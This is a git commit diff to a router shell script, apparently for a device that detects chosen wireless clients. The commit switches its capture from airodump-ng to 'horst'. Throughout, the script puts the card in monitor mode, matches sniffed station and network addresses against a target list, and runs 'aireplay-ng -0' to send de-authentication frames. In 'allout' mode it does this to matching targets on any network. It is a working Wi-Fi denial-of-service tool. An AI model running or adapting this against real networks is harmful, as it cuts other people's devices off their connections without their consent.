ad527d73f447d58732934b3d0080eea2ec2ebcac
Julian Oliver <JulianOliver@users.noreply.github.com>
2015-04-18 02:10:54 +0200

    Switched the WR710N detector over to use 'horst' in the capture routine rather than 'airodump-ng'. Uses 4x less CPU and is significantly faster. 	modified:   files/root/scripts/detect.sh

--- files/root/scripts/detect.sh
+++ files/root/scripts/detect.sh
@@ -18,26 +18,25 @@
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
+trap "trap - SIGTERM && kill -- -$$" SIGINT SIGTERM EXIT
 shopt -s nocasematch # Important
 
 LOGS=/www/logs/
 CAPDIR=/tmp
 CONFIG=/www/config
-POLLTIME=10 # Seconds we wait for capture to find STA/BSSID pairs
-DROPTIME=20 # Seconds we wait for a previously seen target to re-appear before dropping it
-FRAMES=10 # Number of de-auth frames to send. 10 a good hit/time tradeoff
+FRAMES=5 # Number of de-auth frames to send. 10 a good hit/time tradeoff
 NETWORKS='' # Placeholder. Technically redundant.
-
-COUNT=0
-RESET=360
+MODE=$(cat $CONFIG/mode) 
 
 # Read in the user selected target devices and build the target string.
-SRCT=$(cat /www/config/targets | cut -d "," -f 2)
+SRCT=$(cat $CONFIG/targets | cut -d "," -f 2)
 TARGETS='@('$(echo $SRCT | sed 's/\ /\*\|/g')'*)'
 
-# Reload WiFi module, cheap memory flush
-rmmod ath9k
-insmod ath9k
+# Make the activity page the default site page for connections during detection
+# (only available over Ethernet) 
+cp /www/active.php /www/index.php
+rm -f $LOGS/detected
+echo "This is our target list: "$TARGETS > $LOGS/targets
 
 # Set to station mode (taking down 'hostapd') so that we have control of the NIC
 uci set wireless.@wifi-iface[0].mode="sta"
@@ -59,120 +58,111 @@ ifconfig $NIC up
 airmon-ng stop mon0 && airmon-ng start $NIC 
 sleep 2
 
-killall screen
-#killall airodump-ng
-rm -f $LOGS/detected
-rm -f $CAPDIR/cap*.csv 
-
-# Make the activity page the default site page for connections during detection
-# (only available over Ethernet) 
-cp /www/active.php /www/index.php
 
 deauth() {
     echo "Target found."
     # Pause airodump-ng and set the channel
     # We can set the channel of $NIC and mon0 at once as $NIC is in Monitor mode
-    killall -STOP airodump-ng 
-    iwconfig $NIC channel $SETCHANNEL
+    horst -x pause
+    iwconfig $NIC freq $FREQ"000000"
     sleep 1
     # Log this for the report page
     echo $(date) "de-authed" $STA "on" $BSSID >> $LOGS/detected
     # Do the de-auth
     echo "De-authing: " "$STA" " from " "$BSSID"
     aireplay-ng -0 $FRAMES -a $BSSID -c $STA mon0 
-    # Resume airodump-ng
-    killall -CONT airodump-ng 
+    horst -x resume
     # Reset MAC vars 
     STA=ff:ff:ff:ff:ff:ff
     BSSID=ff:ff:ff:ff:ff:ff
 }
 
-MODE=$(cat $CONFIG/mode) 
+channelWalk(){
+    # This is only for Territory mode as horst already has a random walk for all
+    # channels
+    trap "exit" INT
+    while true;
+        do 
+            for c in ${CHANNELS[@]}
+                do
+                    horst -x channel=$c
+                    sleep 1
+                done
+        done
+}
+
+
+horst -u 13 -q -d 250 -i $NIC -f DATA -o $CAPDIR/cap -X detect &
+HPID=$!
+if [ $? -ne 0 ]; then
+  # Something is wrong, like a dead mon0
+  # and/or NIC. Store settings and reboot.
+   touch $CONFIG/updated && reboot -n 
+fi
+#horst -x channel_auto=1
 
 case "$MODE" in 
     *territory*)
-        # Override channels with those of target BSSIDs
-        # Have to call awk twice as need to 'sort -u' for uniqueness first. Fix this.
-        CHANNELS=$(cat /www/config/networks | sort -u | awk 'BEGIN { FS = "," }; { print $NF }' | sort -u | awk '{ print $0 }' ORS=',' | sed 's/,$//')
+        # Override channels with those of target BSSIDs. We have to resource awk
+        # twice, due to two cases of uniqueness tested.
+        CHANNELS=($(cat $CONFIG/networks | sort -u | awk 'BEGIN { FS = "," }; { print $NF }' | sort -u | awk '{ print $0 }'))
+        #CHANNELS=($(cat /www/config/networks | sort -u | awk 'BEGIN { FS = "," }; { print $NF }'))
+        # We'll poll for as many seconds as there are networks to guard 
+        POLLTIME=$(wc -l < $CONFIG/networks)
         echo "These are the networks we're watching"
-        cat /www/config/networks
         # Read in the networks we're watching and build the target string. 
         SRCN=$(cat /www/config/networks | cut -d "," -f 1)
         NETWORKS='@('$(echo $SRCN | sed 's/\ /\|/g')')'
-        # Screen is handy when debugging and needing to log in and live monitor
-        # the airodump-ng output. It adds no overhead so left in.
-        DUMP="screen -Adm airodump-ng -a --output-format csv -c $CHANNELS -w $CAPDIR/cap $NIC"
-        #airodump-ng --output-format csv -c $CHANNELS -w $CAPDIR/cap $NIC
+        channelWalk &
+        CPID=$!
     ;;
     *alarm*)
-        # airodump-ng will do a random walk of channels on its own
-        DUMP="screen -Adm airodump-ng -a --output-format csv -w $CAPDIR/cap $NIC"
-        #airodump-ng --output-format csv -w $CAPDIR/cap $NIC
+        # Put things specific to alarm/alert mode here.
+        POLLTIME=13 # Seconds we wait for capture to find STA/BSSID pairs
+        horst -x channel_auto=1
     ;;
     *allout*)
-        DUMP="screen -Adm airodump-ng -a --output-format csv -w $CAPDIR/cap $NIC"
-        #airodump-ng --output-format csv -w $CAPDIR/cap $NIC
+        # Put things specific to allout mode here.
+        POLLTIME=13 # Seconds we wait for capture to find STA/BSSID pairs
+        horst -x channel_auto=1
     ;;
     *)                    
 esac
 
-# Start airodump-ng
-eval $DUMP
-
-echo "This is our target list: "$TARGETS > $LOGS/targets
-
 while true;
         do
             echo "//------------------------------------------------------->"
-            let "COUNT=$COUNT+1"
             echo "Sleeping for " $POLLTIME " and writing capture log"
             sleep $POLLTIME
             # Sort associated clients into temporary pairing files. Channels are
             # not in the probed/association section of airodump-ng and so the
             # pairs need to be extraced and matched separately.
-            if [[ "$MODE" == "allout" ]]; then
-                cat $CAPDIR/cap*.csv | awk '/Key/ {flag=1;next} /Station/{flag=0} flag {print $1 " " $6}' | sed -e 's/,//g' | sort -u > $CAPDIR/channels 
-            fi
-            cat $CAPDIR/cap*.csv | sed '1,/Probed/d'| awk '{ print $1 " " $8 " " $4 " " $5}' | sed -e 's/,//g' -e '/not/d' | sort -u > $CAPDIR/pairs 
+            cat $CAPDIR/cap | awk '{ print $2 $3 $4 $11 }' | sed 's/,/\ /g' | sort -u > $CAPDIR/pairs
             if [ -f $CAPDIR/pairs ]; then
-                echo "These are our association pairs"
-                cat $CAPDIR/pairs
-            else
-                echo "No association pairs found so far"
-            fi
-            echo "//<-----------------Starting-pass-$COUNT------------------"
-            if [ -f $CAPDIR/pairs ]; then
+                    kill -STOP $CPID
                      while read line;
                              do
-                                STA=$(echo $line | cut -d " " -f 1)
-                                BSSID=$(echo $line | cut -d " " -f 2)
+                                ARR=($line)
+                                SRC=${ARR[0]}
+                                DST=${ARR[1]}
+                                BSSID=${ARR[2]}
+                                FREQ=${ARR[3]}
 
-                                # airodump-ng's '--berlin' flag seems to have no
-                                # impact on the CSV, so time delta must be
-                                # calculated on 'last seen' field.  We use
-                                # seconds since Epoch:
-                                T=$(date "+%s")
+                                echo $SRC $DST $BSSID $FREQ
+
+                                if [ $SRC != $BSSID ]; then
+                                    STA=$SRC
+                                else 
+                                    STA=$DST 
+                                fi
 
                                 if [[ "$STA" == $TARGETS && "$BSSID" == $NETWORKS && "$MODE" == "territory" ]]; then
-                                        LASTT=$(date -d "$(echo $line | cut -d " " -f 3,4)" "+%s")
-                                        let "DELTA=$T - $LASTT"
-                                        if [ $DELTA -lt $DROPTIME ]; then
-                                            SETCHANNEL=$(cat $CONFIG/networks | grep -i $BSSID | awk 'BEGIN { FS = "," }; { print $NF }')
-                                            deauth
-                                        fi
+                                        echo $line
+                                        deauth
                                 elif [[ ( "$STA" == $TARGETS || "$BSSID" == $TARGETS ) && "$MODE" == "allout" ]]; then
-                                        LASTT=$(date -d "$(echo $line | cut -d " " -f 3,4)" "+%s")
-                                        let "DELTA=$T - $LASTT"
-                                        if [ $DELTA -lt $DROPTIME ]; then
-                                            SETCHANNEL=$(cat $CAPDIR/channels | grep -i $BSSID | awk '{ print $2 }') 
-                                            deauth
-                                        fi
+                                        deauth
                                 elif [[ "$MODE" == "alarm" ]]; then 
-                                        LASTT=$(date -d "$(echo $line | cut -d " " -f 3,4)" "+%s")
-                                        let "DELTA=$T - $LASTT"
-                                        if [ $DELTA -lt $DROPTIME ]; then
-                                            echo $(date) "detected" $STA "on" $BSSID >> $LOGS/detected
-                                        fi
+                                        echo $(date) "detected" $STA "on" $BSSID >> $LOGS/detected
                                 else
                                     # Remove redirect during debugging
                                     echo "No targets detected this pair for mode:" $MODE > /dev/null 
@@ -180,24 +170,14 @@ while true;
                         done < $CAPDIR/pairs
                         echo "Removing temporary files."
                         rm -f $CAPDIR/pairs $CAPDIR/channels 
+                        horst -x pause
+                        kill -CONT $CPID
+                        rm -f $CAPDIR/cap
+                        horst -x outfile=$CAPDIR/cap
+                        horst -x resume 
 
-                        # airodump-ng provides no way to flush memory, which can
-                        # grow full of old associations and probes. This results
-                        # in large CSVs, which airodump-ng copies out
-                        # continuously from memory. Here we restart it every
-                        # $RESET passes (default is about an hour) to flush memory.
-                        if [ $COUNT -gt $RESET ]; then
-                            killall screen
-                            COUNT=0
-                            rm -f $CAPDIR/*.csv
-                            sleep 1
-                            eval $DUMP
-                            if [ $? -ne 0 ]; then
-                                # Something is wrong, like a dead mon0
-                                # and/or NIC. Store settings and reboot.
-                                touch $CONFIG/updated && reboot -n 
-                            fi
-
-                        fi
+                    else
+                        echo "No pairs this round"
                     fi
 done
+
